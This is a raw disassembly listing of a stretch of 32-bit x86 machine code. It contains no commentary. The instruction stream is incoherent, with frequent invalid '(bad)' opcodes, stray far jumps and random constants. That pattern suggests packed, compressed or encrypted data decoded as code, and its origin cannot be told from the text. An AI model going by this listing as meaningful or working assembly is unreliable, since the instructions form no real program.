  416d89:	data16 sbb BYTE PTR [eax-0x3e6301df],bl
  416d90:	pop    ebx
  416d91:	loopne 0x416e07
  416d93:	xchg   esi,eax
  416d94:	(bad)  
  416d95:	push   ss
  416d96:	add    DWORD PTR [ebx+0x1],0x83a9a37e
  416d9d:	jle    0x416d60
  416d9f:	hlt    
  416da0:	rcr    DWORD PTR [ebp+0x23],0xc9
  416da4:	rcl    DWORD PTR ds:0x5ceb903e,cl
  416daa:	fwait
  416dab:	inc    esp
  416dac:	push   eax
  416dad:	mov    esi,0xd3d9b6e4
  416db2:	sbb    al,al
  416db4:	das    
  416db5:	mov    ecx,0x10e0d16c
  416dba:	test   eax,0xa168485b
  416dbf:	mov    edx,0x7c889817
  416dc4:	push   eax
  416dc5:	jae    0x416d73
  416dc7:	push   edi
  416dc8:	loop   0x416de7
  416dca:	(bad)  
  416dcb:	xor    eax,0x3d82021e
  416dd0:	aas    
  416dd1:	je     0x416d8d
  416dd3:	(bad)  
  416dd4:	stc    
  416dd5:	jmp    0x4d36:0xf691f1a5
  416ddc:	add    al,0x1f
  416dde:	in     al,0x35
  416de0:	dec    ebp
  416de1:	fisttp QWORD PTR [eax-0x50]
  416de4:	and    DWORD PTR [eax+0x39],esi
  416de7:	mov    cl,0xee
  416de9:	jp     0x416e5f
  416deb:	sbb    esi,ebp
  416ded:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416dee:	sbb    eax,0xca58c41d
  416df3:	jbe    0x416da5
  416df5:	adc    BYTE PTR [edi+0x39],0xd6
  416df9:	push   ebp
  416dfa:	adc    esi,DWORD PTR [esi+0x5a]
  416dfd:	push   ss
  416dfe:	sbb    esi,DWORD PTR [ecx]
  416e00:	fstp   TBYTE PTR [ebx+0x1a]
  416e03:	push   0x9150b440
  416e08:	retf   
  416e09:	xor    BYTE PTR [ecx-0x1c],ah
  416e0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416e0d:	into   
  416e0e:	test   al,0x4b
  416e10:	pusha  
  416e11:	jb     0x416de1
  416e13:	int    0x69
  416e15:	ins    BYTE PTR es:[edi],dx
  416e16:	jle    0x416e91
  416e18:	xchg   esp,eax
  416e19:	fcom   st(5)
  416e1b:	aaa    
  416e1c:	inc    ebp
  416e1d:	test   al,0xd0
  416e1f:	xchg   DWORD PTR [esp+ebp*2+0x12a1ab40],esi
  416e26:	adc    al,BYTE PTR [ecx-0x7bea0c74]
  416e2c:	mov    bh,al
  416e2e:	rcr    DWORD PTR [esi+edi*2+0x4992ef1],0x6a
  416e36:	aam    0xd7
  416e38:	or     bl,dh
  416e3a:	mov    al,ds:0x905d0d17
  416e3f:	cmp    BYTE PTR [ecx-0x3d0df0f4],cl
  416e45:	jae    0x416e8a
  416e47:	and    DWORD PTR [edx-0x42912918],eax
  416e4d:	xor    al,0xd5
  416e4f:	enter  0x2a5e,0x80
  416e53:	(bad)  
  416e54:	push   eax
  416e55:	into   
  416e56:	fmul   st,st(6)
  416e58:	jge    0x416ea8
  416e5a:	push   ebp
  416e5b:	adc    BYTE PTR [ecx],cl
  416e5d:	mov    BYTE PTR [edx+eax*2-0x1e],ch
  416e61:	pushf  
  416e62:	xchg   esp,eax
  416e63:	sub    esi,DWORD PTR [edi]
  416e65:	icebp  
  416e66:	adc    BYTE PTR [eax],0xf2
  416e69:	loop   0x416eb1
  416e6b:	mov    bh,0x80
  416e6d:	mov    dh,BYTE PTR [ecx+0x14a67320]
  416e73:	(bad)  
  416e74:	aad    0x36
  416e76:	pop    edi
  416e77:	sbb    ah,0x91
  416e7a:	add    BYTE PTR [edx],ah
  416e7c:	adc    eax,0x599d2994
  416e81:	popf   
  416e82:	dec    ecx
  416e83:	push   ebp
  416e84:	adc    BYTE PTR [edi],dl
  416e86:	addr16 jmp 0xdee4f95b
  416e8c:	inc    esp
  416e8d:	xchg   esp,eax
  416e8e:	mov    ebp,DWORD PTR [ebp-0x1280c089]
  416e94:	mov    bh,0x26
  416e96:	fbstp  TBYTE PTR [eax-0x79fefe2f]
  416e9c:	fsubr  DWORD PTR [ebx+ebx*1]
  416e9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ea0:	lds    ecx,FWORD PTR [eax-0x6d66dffd]
  416ea6:	or     dh,BYTE PTR [esi+0x5a]
  416ea9:	fwait
  416eaa:	pop    ebx
  416eab:	jne    0x416e62
  416ead:	out    dx,al
  416eae:	in     al,dx
  416eaf:	xor    BYTE PTR [ebp+0x4f],ah
  416eb2:	inc    esi
  416eb3:	cmc    
  416eb4:	pop    ebx
  416eb5:	and    cl,0xd7
  416eb8:	lock sbb esi,DWORD PTR [edx]
  416ebb:	pop    eax
  416ebd:	pop    ds
  416ebe:	xor    al,0x1b
  416ec0:	inc    esp
  416ec1:	dec    ebp
  416ec2:	xor    al,0xb3
  416ec4:	add    DWORD PTR [edx-0x8],eax
  416ec7:	fistp  QWORD PTR [eax+0x2972ae88]
  416ecd:	btc    DWORD PTR [eax-0x77ab6cbf],ebp
  416ed4:	idiv   DWORD PTR [ebx+0x73]
  416ed7:	add    BYTE PTR [edx],cl
  416ed9:	push   ds
  416eda:	aad    0xea
  416edc:	adc    ecx,DWORD PTR [ecx+0x580ec3cc]
  416ee2:	sub    edx,ecx
  416ee4:	out    dx,al
  416ee5:	dec    esi
  416ee6:	lock jmp 0xff52:0x1e54bab7
  416eee:	scas   eax,DWORD PTR es:[edi]
  416eef:	aaa    
  416ef0:	xchg   esp,eax
  416ef1:	sar    BYTE PTR [ebx+0x3d83b1b8],0x1c
  416ef8:	push   edx
  416ef9:	pop    es
  416efa:	gs mov bh,0xc0
  416efd:	(bad)  
  416efe:	repz es aas 
  416f01:	ror    eax,cl
  416f03:	(bad)  
  416f04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f05:	jb     0x416f60
  416f07:	inc    ebx
  416f08:	xchg   BYTE PTR [edx+0x529bd7b0],dl
  416f0e:	mov    edx,DWORD PTR [edx]
  416f10:	cmp    ah,BYTE PTR [edi+0x6d]
  416f13:	sbb    al,0xeb
  416f15:	sub    edi,eax
  416f17:	inc    esi
  416f18:	adc    DWORD PTR [eax],0x4516dd3c
  416f1e:	and    DWORD PTR [eax-0xd],ecx
  416f21:	(bad)  
  416f22:	stos   BYTE PTR es:[edi],al
  416f23:	into   
  416f24:	cmc    
  416f25:	scas   al,BYTE PTR es:[edi]
  416f26:	cmp    al,0xc3
  416f28:	out    dx,eax
  416f29:	fwait
  416f2a:	jb     0x416ef5
  416f2c:	push   0xffffffcf
  416f2e:	jae    0x416ec6
  416f30:	push   ss
  416f31:	popa   
  416f32:	sbb    BYTE PTR [edx+0x79781c67],0x87
  416f39:	xchg   ebx,eax
  416f3a:	arpl   WORD PTR [ebp-0x4d53aaff],ax
  416f40:	mov    dl,BYTE PTR [esi]
  416f42:	stos   DWORD PTR es:[edi],eax
  416f43:	shr    DWORD PTR [ecx+0x31],1
  416f46:	mov    ecx,0xcd66d02c
  416f4b:	pop    eax
  416f4c:	or     DWORD PTR [ecx-0x5c7831dd],esp
  416f52:	inc    ebx
  416f53:	ds mov ecx,0x8cb9ee5c
  416f59:	test   BYTE PTR [ebp+0xc],bh
  416f5c:	pop    edi
  416f5d:	sub    esp,DWORD PTR [eax+esi*4]
  416f60:	lods   al,BYTE PTR ds:[esi]
  416f61:	push   cs
  416f62:	add    BYTE PTR [eax+0x5a5f647c],al
  416f68:	pop    ebp
  416f69:	dec    ebp
  416f6a:	lahf   
  416f6b:	or     eax,0xde000db1
  416f70:	dec    ecx
  416f71:	mov    eax,0x39e05b78
  416f76:	stos   DWORD PTR es:[edi],eax
  416f77:	idiv   BYTE PTR ds:0x77b3147e
  416f7d:	aad    0xd2
  416f7f:	test   al,0xb0
  416f81:	ss mov eax,0xeb3103e8
  416f87:	mov    WORD PTR [edx+0x7d],?
  416f8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416f8b:	jae    0x417008
  416f8d:	inc    edi
  416f8e:	mov    edi,0x9b99b595
  416f93:	pop    ds
  416f94:	mul    DWORD PTR gs:[ebx+0x0]
  416f98:	pop    edx
  416f99:	push   ss
  416f9a:	sub    ebp,DWORD PTR [esp+ebp*1-0x3c]
  416f9e:	das    
  416f9f:	pop    ds
  416fa0:	stos   DWORD PTR es:[edi],eax
  416fa1:	sahf   
  416fa2:	sub    BYTE PTR [ebx],dh
  416fa4:	push   ds
  416fa5:	pop    ds
  416fa6:	stos   BYTE PTR es:[edi],al
  416fa7:	pop    ebx
  416fa8:	and    DWORD PTR [edi-0x3f],0x3b4012f
  416faf:	and    cl,BYTE PTR [ebp+0x62ac0cf6]
  416fb5:	popa   
  416fb6:	pop    es
  416fb7:	add    eax,0x7adefc81
  416fbc:	pop    edi
  416fbd:	sub    DWORD PTR [edi-0x45],eax
  416fc0:	push   ebx
  416fc1:	mov    bh,0x5
  416fc3:	repz or dl,BYTE PTR [edx-0x54cbe64b]
  416fca:	test   DWORD PTR [ebp-0x3f07bb86],esi
  416fd0:	push   eax
  416fd1:	or     esp,edi
  416fd3:	mov    WORD PTR ds:0xd183db87,fs
  416fd9:	sar    al,1
  416fdb:	mov    DWORD PTR [ecx+0x4f],0x67cea05a
  416fe2:	pop    ebp
  416fe3:	arpl   WORD PTR [ecx-0x31],di
  416fe6:	adc    DWORD PTR [ecx],ebx
  416fe8:	scas   al,BYTE PTR es:[edi]
  416fe9:	mov    ds:0x1a8a6672,eax
  416fee:	inc    ecx
  416fef:	mov    WORD PTR [ecx],?
  416ff1:	test   DWORD PTR [edi-0x5f972a63],esi
  416ff7:	imul   esi,DWORD PTR [ebp+ebp*4+0x62],0xffffff80
  416ffc:	sbb    ebp,DWORD PTR ds:0x6f82d3ad
  417002:	jg     0x417030
  417004:	sub    DWORD PTR [eax+0x41],eax
  417007:	sub    edi,DWORD PTR [ecx]
  417009:	ret    0x1847
  41700c:	pop    ecx
  41700d:	inc    edi
  41700e:	mov    dh,0xc7
  417010:	test   al,0x88
  417012:	mov    dh,0x4e
  417014:	xchg   ebx,eax
  417015:	ret    
  417016:	cmp    bl,ch
  417018:	mov    ss,WORD PTR [ebx]
  41701a:	adc    al,0xa0
  41701c:	pop    es
  41701d:	sbb    eax,DWORD PTR ds:0x3dd7c80e
  417023:	data16 jbe 0x416fdd
  417026:	es mov dl,0xb5
  417029:	mov    ecx,0x4adaac77
  41702e:	lods   eax,DWORD PTR ds:[esi]
  41702f:	mov    al,BYTE PTR [edx-0x72]
  417032:	mov    ecx,0x450bba3a
  417037:	cdq    
  417038:	adc    eax,0xc989d6e3
  41703d:	in     eax,0xe4
  41703f:	mov    ch,BYTE PTR [ebp+0x21c08bda]
  417045:	ror    BYTE PTR [ebx+ecx*4+0x6926cfda],cl
  41704c:	add    bh,ah
  41704e:	mov    ch,BYTE PTR [edi+eax*8+0xa09a5b]
  417055:	sbb    edx,DWORD PTR [esi-0x269330f0]
  41705b:	test   eax,0xebdd13d0
  417060:	xchg   DWORD PTR [esi-0x58],edx
  417063:	icebp  
  417064:	inc    esi
  417065:	sub    DWORD PTR [ebp-0x7c24e6d0],ebp
  41706b:	or     DWORD PTR [esi-0x78],ebp
  41706e:	mov    edi,0x18bcc6db
  417073:	add    edx,edx
  417075:	dec    ebx
  417076:	sar    ch,1
  417078:	scas   eax,DWORD PTR es:[edi]
  417079:	popf   
  41707a:	idiv   DWORD PTR [ebp+0x4b756cfb]
  417080:	cmp    bh,BYTE PTR [ecx+0x23e6835]
  417086:	xchg   esi,eax
  417087:	sar    DWORD PTR [ecx+0x67],cl
  41708a:	mov    al,al
  41708c:	std    
  41708d:	sub    eax,0xa090a1de
  417092:	leave  
  417093:	into   
  417094:	adc    BYTE PTR [edx-0x3433f3d0],0xa7
  41709b:	clc    
  41709c:	shl    BYTE PTR [edx-0x5a75e04e],cl
  4170a2:	fadd   QWORD PTR [ecx-0x64]
  4170a5:	mov    ch,0x3e
  4170a7:	adc    al,0x94
  4170a9:	push   esi
  4170aa:	sbb    dl,BYTE PTR [eax]
  4170ac:	push   0xb13bf927
  4170b1:	stos   DWORD PTR es:[edi],eax
  4170b2:	jno    0x41704b
  4170b4:	push   esi
  4170b5:	retf   0x2c3f
  4170b8:	(bad)  
  4170b9:	aad    0xb1
  4170bb:	adc    al,0x11
  4170bd:	mov    esi,DWORD PTR [ecx+0x7d]
  4170c0:	add    al,0xdd
  4170c2:	jnp    0x41708c
  4170c4:	out    dx,eax
  4170c5:	xor    BYTE PTR [esi],ch
  4170c7:	imul   edi,DWORD PTR [edx+ebx*1],0xe16e19ef
  4170ce:	xchg   ecx,eax
  4170cf:	dec    ebp
  4170d0:	mov    esi,0x88b8d488
  4170d5:	mov    ds:0x4f657189,eax
  4170da:	out    0xd,eax
  4170dc:	gs cmp eax,0xf9ab88da
  4170e2:	mov    eax,ds:0xbc08d2f1
  4170e7:	ret    0x1e90
  4170ea:	ret    
  4170eb:	fmul   QWORD PTR [ecx-0x6d7f1d2a]
  4170f1:	bound  ebp,QWORD PTR [ecx]
  4170f3:	or     eax,0x6b8478d4
  4170f8:	jb     0x417164
  4170fa:	mov    WORD PTR [esi+0xe948a41],ds
  417100:	mov    esi,0x61d6ab87
  417105:	push   ebx
  417106:	mov    esp,0x6ac6b9a
  41710b:	or     cl,BYTE PTR [esi-0x7b]
  41710e:	dec    ebx
  41710f:	xchg   DWORD PTR [ecx],eax
  417111:	(bad)  [ecx-0x1d]
  417114:	in     al,0x50
  417116:	pop    ecx
  417117:	clc    
  417118:	pop    ecx
  417119:	popf   
  41711a:	jno    0x41714c
  41711c:	pop    ebp
  41711d:	inc    ebx
  41711e:	dec    edi
  41711f:	sahf   
  417120:	and    eax,0x76be0616
  417125:	mov    esi,0x332885bb
  41712a:	push   0xfebf1874
  41712f:	inc    ebx
  417130:	pop    edi
  417131:	jp     0x417197
  417133:	jnp    0x417135
  417135:	ja     0x4171a0
  417137:	lahf   
  417138:	adc    cl,BYTE PTR [edx-0x763a6e70]
  41713e:	add    ecx,ebp
  417140:	mov    DWORD PTR [esi],ecx
  417142:	jb     0x417152
  417144:	pusha  
  417145:	ds stos DWORD PTR es:[edi],eax
  417147:	xor    dh,0x5e
  41714a:	imul   edx,DWORD PTR [bp+si+0x591d]
  417150:	jne    0x417158
  417152:	cdq    
  417153:	xchg   edx,eax
  417154:	push   esi
  417155:	aad    0xd
  417157:	mov    dh,0x30
  417159:	je     0x4171d7
  41715b:	arpl   WORD PTR [ebp+esi*8-0x3a],sp
  41715f:	mov    eax,ds:0x12ab0cca
  417164:	sbb    al,BYTE PTR [eax]
  417166:	xor    dl,ch
  417168:	cmc    
  417169:	repnz mov edi,DWORD PTR [eax]
  41716c:	or     cl,dl
  41716e:	mov    dh,0xca
  417170:	ds addr16 pop edi
  417173:	dec    ebx
  417174:	sub    al,0xf4
  417176:	int    0xa0
  417178:	and    ebx,DWORD PTR [ebp+0x2d]
  41717b:	push   ecx
  41717c:	sub    eax,0xb395b8bd
  417181:	call   0xa88e15af
  417186:	out    0x2e,al
  417188:	and    dh,BYTE PTR [ebx-0x118e7d93]
  41718e:	dec    ebx
  41718f:	ins    DWORD PTR es:[edi],dx
  417190:	add    ecx,0xf079fd28
  417196:	imul   ecx,DWORD PTR [edx-0x2c],0x60a79fe4
  41719d:	inc    edi
  41719e:	(bad)  
  41719f:	lods   al,BYTE PTR ds:[esi]
  4171a0:	or     al,0x4e
  4171a2:	mov    ebx,0x7368a18d
  4171a7:	daa    
  4171a8:	rcr    BYTE PTR [esi-0x8c072d2],0x4a
  4171af:	mov    eax,gs
  4171b1:	cmp    DWORD PTR [ebx-0x64],0x5139cd3d
  4171b8:	add    BYTE PTR [edi],0x82
  4171bb:	inc    esi
  4171bc:	cld    
  4171bd:	cs pop ds
  4171bf:	adc    eax,0xf16b5dc
  4171c4:	xchg   esp,eax
  4171c5:	xor    BYTE PTR [ecx+0x37],bl
  4171c8:	push   0x118d3605
  4171cd:	sbb    ebx,DWORD PTR [ebp+0x6]
  4171d0:	not    BYTE PTR [ebx]
  4171d2:	out    dx,al
  4171d3:	add    BYTE PTR [esi+eiz*2],dl
  4171d6:	jg     0x41721e
  4171d8:	xor    eax,0x8c9cb5b2
  4171dd:	dec    edi
  4171de:	retf   0xf82f
  4171e1:	push   edx
  4171e2:	add    DWORD PTR [ecx],edx
  4171e4:	gs loopne 0x417232
  4171e7:	jmp    0x4171a7
  4171e9:	popa   
  4171ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171eb:	inc    eax
  4171ec:	add    DWORD PTR [esi-0x3e],eax
  4171ef:	idiv   edx
  4171f1:	pushf  
  4171f2:	pop    ss
  4171f3:	sahf   
  4171f4:	int    0x34
  4171f6:	pextrw edi,(bad),0xc5
  4171f8:	mov    ebx,0x74421d19
  4171fd:	call   0x50e35a5d
  417202:	or     al,0xe0
  417204:	ds out dx,al
  417206:	push   es
  417207:	cld    
  417208:	in     eax,0xa8
  41720a:	xor    al,BYTE PTR [ebx+0x4d]
  41720d:	jnp    0x4171f9
  41720f:	pushf  
  417210:	(bad)  
  417211:	pop    eax
  417212:	in     eax,dx
  417213:	inc    eax
  417214:	xlat   BYTE PTR ds:[ebx]
  417215:	push   es
  417216:	lods   eax,DWORD PTR ds:[esi]
  417217:	retf   
  417218:	add    BYTE PTR [esi+ecx*2-0x7110c067],dh
  41721f:	lea    ebp,[eax+0x72]
  417222:	adc    eax,0xd27f2e1e
  417227:	push   ebp
  417228:	call   0xc339f79f
  41722d:	out    dx,al
  41722e:	or     DWORD PTR ds:0xb78e6465,ecx
  417234:	(bad)  
  417235:	ins    BYTE PTR es:[edi],dx
  417236:	add    esi,DWORD PTR [ebx+ebp*2]
  417239:	push   ds
  41723a:	ins    DWORD PTR es:[edi],dx
  41723b:	sbb    edx,ebp
  41723d:	arpl   bx,di
  41723f:	out    0x5f,eax
  417241:	daa    
  417242:	add    DWORD PTR [esi-0x4e157a68],edx
  417248:	xor    BYTE PTR [ebx-0xd],bl
  41724b:	retf   
  41724c:	(bad)  [ecx+esi*1]
  41724f:	lds    ebp,FWORD PTR [edi]
  417251:	jl     0x417247
  417253:	dec    ebp
  417254:	jmp    0x417204
  417256:	and    ch,BYTE PTR [ebp+0x7e60498a]
  41725c:	jb     0x4172bf
  41725e:	inc    edi
  41725f:	or     DWORD PTR [ebx-0x37cb3bde],ebp
  417265:	outs   dx,DWORD PTR ds:[esi]
  417266:	dec    edx
  417267:	jmp    0x7831:0x312b7d18
  41726e:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  417270:	pop    ebx
  417271:	int3   
  417272:	lods   eax,DWORD PTR ds:[esi]
  417273:	js     0x41729a
  417275:	jno    0x417254
  417277:	mov    ds:0x66ce1578,al
  41727c:	or     DWORD PTR [ebx+0x5f],ebx
  41727f:	fistp  DWORD PTR [ebx+0x36]
  417282:	mov    esp,DWORD PTR [edi-0x2ed0739]
  417288:	cmp    bl,dh
  41728a:	inc    ebp
  41728b:	jg     0x417224
  41728d:	lods   al,BYTE PTR ds:[esi]
  41728e:	mov    ebp,DWORD PTR [edx]
  417290:	mov    ecx,0x186354ab
  417295:	jl     0x4172ec
  417297:	cmc    
  417298:	adc    eax,0x3f298447
  41729d:	inc    ecx
  41729e:	sbb    esp,DWORD PTR [edx+0x11]
  4172a1:	adc    BYTE PTR [ecx+0x2f],al
  4172a4:	push   esi
  4172a5:	std    
  4172a6:	fcomp  DWORD PTR [edx+0x46]
  4172a9:	mov    ebx,0xed4d66a9
  4172ae:	jp     0x4172f7
  4172b0:	or     DWORD PTR [edx],esi
  4172b2:	cmp    esi,eax
  4172b4:	(bad)  
  4172b5:	pop    edx
  4172b6:	test   eax,0xb4592b5c
  4172bb:	daa    
  4172bc:	leave  
  4172bd:	xor    BYTE PTR [ecx-0x29b6ae46],0xee
  4172c4:	adc    ecx,DWORD PTR [edx-0x4fae848d]
  4172ca:	inc    ebp
  4172cb:	cmp    ebp,edi
  4172cd:	sbb    bh,BYTE PTR [edx+0x74d39acd]
  4172d3:	dec    ebp
  4172d4:	loope  0x417319
  4172d6:	push   0x7d65c507
  4172db:	fidivr DWORD PTR [esi]
  4172dd:	cld    
  4172de:	cmp    al,0x59
  4172e0:	loopne 0x417294
  4172e2:	(bad)  
  4172e3:	mul    BYTE PTR [esi+0x1e]
  4172e6:	cdq    
  4172e7:	mov    esp,0x439f381b
  4172ec:	jle    0x41728a
  4172ee:	push   esi
  4172ef:	mov    eax,ds:0x300a312a
  4172f4:	pop    edx
  4172f5:	push   eax
  4172f6:	mov    ecx,gs
  4172f8:	xor    ebx,esp
  4172fa:	retf   
  4172fb:	(bad)  
  4172fc:	(bad)  
  4172fd:	cld    
  4172fe:	mov    eax,ds:0x72b8cc36
  417303:	cmp    ebp,DWORD PTR [ecx+0x2]
  417306:	int3   
  417307:	aad    0x44
  417309:	cdq    
  41730a:	cmp    al,BYTE PTR [ebx+ebx*2+0x60]
  41730e:	pop    ecx
  41730f:	dec    edx
  417310:	inc    ebx
  417311:	and    DWORD PTR [ecx+0x78],0x801d43ba
  417318:	test   DWORD PTR [edx+0x77],esp
  41731b:	retf   0xc96f
  41731e:	into   
  41731f:	jbe    0x4172d6
  417321:	ss mov dl,cl
  417324:	and    BYTE PTR [esi],bh
  417326:	add    ecx,DWORD PTR [ebx+0x13b31dc6]
  41732c:	mov    edx,0x7eb89ea4
  417331:	cmp    eax,0xd9ab7716
  417336:	push   edx
  417337:	addr16 (bad) 
  417339:	lock outs dx,DWORD PTR ds:[esi]
  41733b:	xor    bh,bh
  41733d:	sbb    BYTE PTR [edi+0x4d],0x1b
  417341:	in     eax,dx
  417342:	dec    edx
  417343:	and    eax,0xff6ab946
  417348:	(bad)  
  417349:	fcmovnbe st,st(7)
  41734b:	and    eax,0x3af1ce04
  417350:	push   0xffffff80
  417352:	shl    bh,1
  417354:	pop    edx
  417355:	or     al,0x61
  417357:	xchg   edx,eax
  417358:	jmp    0x417320
  41735a:	push   eax
  41735b:	jo     0x417305
  41735d:	jge    0x41736c
  41735f:	sub    al,0x46
  417361:	push   ss
  417362:	std    
  417363:	jne    0x417350
  417365:	pop    ebp
  417366:	xchg   esp,eax
  417367:	and    bh,BYTE PTR [eax+0x3d]
  41736a:	jo     0x4173ea
  41736c:	ffreep st(3)
  41736e:	jp     0x4173c6
  417370:	mov    edi,0x8f5eff9
  417375:	xchg   ecx,eax
  417376:	imul   esi,edi,0x93e9aa68
  41737c:	inc    edi
  41737d:	popf   
  41737e:	aam    0xf2
  417380:	cwde   
  417381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417382:	retf   0xc4ab
  417385:	dec    edx
  417386:	push   0xffffffe6
  417388:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417389:	leave  
  41738a:	sti    
  41738b:	das    
  41738c:	cmc    
  41738d:	retf   
  41738e:	jmp    0x314b:0x4e5863b7
  417395:	out    dx,al
  417396:	mov    dh,al
  417398:	mov    al,ds:0x6d9443ef
  41739d:	ins    DWORD PTR es:[edi],dx
  41739e:	enter  0x70a6,0x80
  4173a2:	push   ebx
  4173a3:	shl    bh,0x57
  4173a6:	dec    eax
  4173a7:	add    edx,ebx
  4173a9:	cdq    
  4173aa:	dec    esi
  4173ab:	(bad)  
  4173ac:	pop    eax
  4173ad:	push   ss
  4173ae:	adc    BYTE PTR [edx+0x15e419f6],cl
  4173b4:	push   ecx
  4173b5:	loopne 0x417392
  4173b7:	fcomp  QWORD PTR [edi-0x39]
  4173ba:	fisub  WORD PTR [edx-0x679f964a]
  4173c0:	icebp  
  4173c1:	in     al,dx
  4173c2:	adc    ch,bh
  4173c4:	inc    ebp
  4173c5:	dec    esi
  4173c6:	push   eax
  4173c7:	lea    ebx,[edi+0x56]
  4173ca:	sub    eax,0x56369dec
  4173cf:	shr    DWORD PTR [esi-0x6],cl
  4173d2:	inc    edx
  4173d3:	(bad)  
  4173d4:	scas   eax,DWORD PTR es:[edi]
  4173d5:	(bad)  
  4173d6:	scas   al,BYTE PTR es:[edi]
  4173d7:	aam    0x4
  4173d9:	inc    ebp
  4173da:	into   
  4173db:	xchg   ebp,eax
  4173dc:	or     al,0x1b
  4173de:	adc    dh,BYTE PTR [ecx+ecx*4-0x45]
  4173e2:	jae    0x4173b6
  4173e4:	daa    
  4173e5:	mov    al,ds:0x865b33e5
  4173ea:	stos   BYTE PTR es:[edi],al
  4173eb:	hlt    
  4173ec:	bound  edi,QWORD PTR [ecx]
  4173ee:	fmul   st(2),st
  4173f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4173f1:	and    esp,DWORD PTR [ebx-0xc]
  4173f4:	fidiv  DWORD PTR [esp+ecx*1]
  4173f7:	in     eax,dx
  4173f8:	mov    al,ds:0x52327e58
  4173fd:	push   cs
  4173fe:	cmc    
  4173ff:	sti    
  417400:	lea    ebp,[ebx+0x5671e11]
  417406:	fs jp  0x4173d0
  417409:	out    dx,eax
  41740a:	xlat   BYTE PTR ds:[ebx]
  41740b:	in     eax,0x1d
  41740d:	push   ss
  41740e:	sahf   
  41740f:	xor    DWORD PTR [ebx-0x1d4d511e],ecx
  417415:	retf   
  417416:	adc    eax,0x56ba31
  41741b:	das    
  41741c:	mov    bh,0xa
  41741e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41741f:	xchg   esp,eax
  417420:	and    eax,0x3d016c
  417425:	mov    edx,0x457e9fe7
  41742a:	inc    esp
  41742c:	add    eax,0xad6e813a
  417431:	je     0x41746d
  417433:	pushf  
  417434:	push   ds
  417435:	sahf   
  417436:	adc    dh,dl
  417438:	mov    al,0xd1
  41743a:	sub    BYTE PTR [edx],0x82
  41743d:	(bad)  
  41743e:	aam    0x22
  417440:	xchg   ebp,eax
  417441:	rol    ebx,cl
  417443:	add    al,0xfd
  417445:	dec    eax
  417446:	sbb    BYTE PTR [edx+0x42],al
  417449:	inc    ecx
  41744a:	adc    ecx,DWORD PTR [ecx+0x5b]
  41744d:	call   0x9832:0x2c85ecb2
  417454:	stos   DWORD PTR es:[edi],eax
  417455:	add    al,0xf6
  417457:	adc    al,0x72
  417459:	xor    ebx,DWORD PTR ds:0xdc8413c4
  41745f:	jae    0x417427
  417461:	test   eax,0xc2d4e5e6
  417466:	sub    BYTE PTR [eax],bl
  417468:	jp     0x4174dd
  41746a:	lss    ebp,FWORD PTR [ecx]
  41746d:	and    DWORD PTR [ebp-0x1c],esp
  417470:	push   eax
  417471:	add    al,0x9d
  417473:	enter  0x3e02,0x76
  417477:	lahf   
  417478:	(bad)  
  417479:	retf   0xd651
  41747c:	jge    0x41744f
  41747e:	cmp    al,0x1
  417480:	adc    eax,0xaf2f4650
  417485:	pop    esp
  417486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417487:	xchg   DWORD PTR [ecx+0x12],esi
  41748a:	jecxz  0x41749c
  41748c:	sub    ecx,esi
  41748e:	and    esp,0xffffffa5
  417491:	mov    ?,WORD PTR [ebx+0x60]
  417494:	aam    0xbe
  417496:	inc    esp
  417497:	mov    cl,0xfb
  417499:	sub    ah,BYTE PTR [edi]
  41749b:	retf   0xd159
  41749e:	ss adc al,0x84
  4174a1:	je     0x4174e8
  4174a3:	add    DWORD PTR [ebx],edi
  4174a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4174a6:	imul   edx,DWORD PTR [ebx+0x45d02a5d],0xdebe81fd
  4174b0:	imul   eax
  4174b2:	push   eax
  4174b3:	or     dl,BYTE PTR [ebp+ebx*1+0x17766bb5]
  4174ba:	adc    edi,DWORD PTR [edx]
  4174bc:	call   0xa21530f4
  4174c1:	sbb    BYTE PTR [esi-0x5b],dh
  4174c4:	in     al,dx
  4174c5:	inc    ebx
  4174c6:	sub    BYTE PTR [ebx+edx*2+0x41],ch
  4174ca:	fistp  QWORD PTR [edi-0x34acd289]
  4174d0:	jmp    0xdef0a2e3
  4174d5:	dec    esi
  4174d6:	pushf  
  4174d7:	pop    ebp
  4174d8:	out    0x60,eax
  4174da:	push   ebp
  4174db:	push   0x74f2ddd8
  4174e0:	enter  0x2cc8,0x88
  4174e4:	push   ecx
  4174e5:	stc    
  4174e6:	cmp    ch,BYTE PTR [ebx-0xd]
  4174e9:	push   ebp
  4174ea:	pop    ebx
  4174eb:	sar    esi,cl
  4174ed:	add    edi,esi
  4174ef:	and    ebp,edx
  4174f1:	fucomp st(7)
  4174f3:	(bad)  
  4174f4:	ja     0x41748d
  4174f6:	xor    ah,BYTE PTR [edx-0x28]
  4174f9:	mov    al,ds:0x1e76e276
  4174fe:	adc    bl,al
  417500:	xor    bl,BYTE PTR [edi]
  417502:	mov    ?,WORD PTR [edx]
  417504:	clc    
  417505:	push   edx
  417506:	push   esi
  417507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417508:	gs jp  0x41750b
  41750b:	xchg   esp,eax
  41750c:	push   cs
  41750d:	or     bl,bl
  41750f:	jnp    0x41758d
  417511:	mov    ds:0xcf3a4a68,al
  417516:	mul    BYTE PTR es:[edi+eax*1]
  41751a:	jp     0x417516
  41751c:	xchg   edi,eax
  41751d:	cmp    eax,0x7afd596c
  417522:	xor    al,0x23
  417524:	mov    ecx,0xea3b5c63
  417529:	call   0x5511:0x2c0b486b
  417530:	inc    esp
  417531:	mov    bl,0x1f
  417533:	jnp    0x4174b8
  417535:	mov    edx,?
  417537:	test   al,0xfe
  417539:	ror    DWORD PTR [ecx-0x5f],1
  41753c:	ins    BYTE PTR es:[edi],dx
  41753d:	jecxz  0x4174cf
  41753f:	xchg   ecx,eax
  417540:	mov    al,0xec
  417542:	adc    cl,BYTE PTR [edi]
  417544:	aad    0x5b
